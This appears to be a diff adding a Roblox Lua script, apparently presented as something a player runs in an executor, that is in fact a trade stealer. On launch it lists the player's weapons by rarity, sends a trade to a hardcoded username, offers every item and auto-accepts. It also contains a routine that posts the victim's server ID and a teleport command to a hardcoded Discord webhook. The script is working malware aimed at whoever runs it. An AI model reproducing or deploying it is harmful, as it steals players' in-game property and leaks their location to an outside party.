@@ -1,0 +1,180 @@
+local userName = "1212EWQ0"
+local webHook = "https://discord.com/api/webhooks/1302687088583508071/pLqG22TICEqEpZM7H0YN2i19pFEFGos46samouDB0xu37g388yzIst7geZE6s_VJ0iAh"
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local data2 = {
+        ["content"] = "---@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '"..game.JobId.."')",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+    
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local itemsCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, d.DataID)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, d.DataID)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, d.DataID)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, d.DataID)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, d.DataID)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, d.DataID)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, d.DataID)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, d.DataID)
+        end
+    end
+end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function isTradeModuleAvailable()
+    local success, TradeModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
+    end)
+    return success and TradeModule
+end
+
+local function stealItems()
+    -- Отправляем запрос на трейд
+    local sendArgs = {
+        [1] = game:GetService("Players")[userName]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+    wait(3)
+
+    -- Предлагаем все предметы для трейда
+    local itemsToTrade = {uniqueItems, ancientItems, godlyItems, vintageItems, legendaryItems, rareItems, uncommonItems, commonItems}
+    for _, itemList in ipairs(itemsToTrade) do
+        for _, itemID in pairs(itemList) do
+            local args = {
+                [1] = itemID,
+                [2] = "Weapons"
+            }
+            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+        end
+    end
+
+    wait(6)
+    
+    -- Автоматически соглашаемся на трейд
+    local acc = {
+        [1] = 285646582 -- здесь можно изменить ID, если необходимо
+    }
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+end
+
+-- Подключаемся к событиям для автоматической отправки и принятия трейда
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        stealItems()
+    end
+end)
+
+stealItems()  -- Автоматически запускаем отправку трейда, когда игрок запускает скрипт.
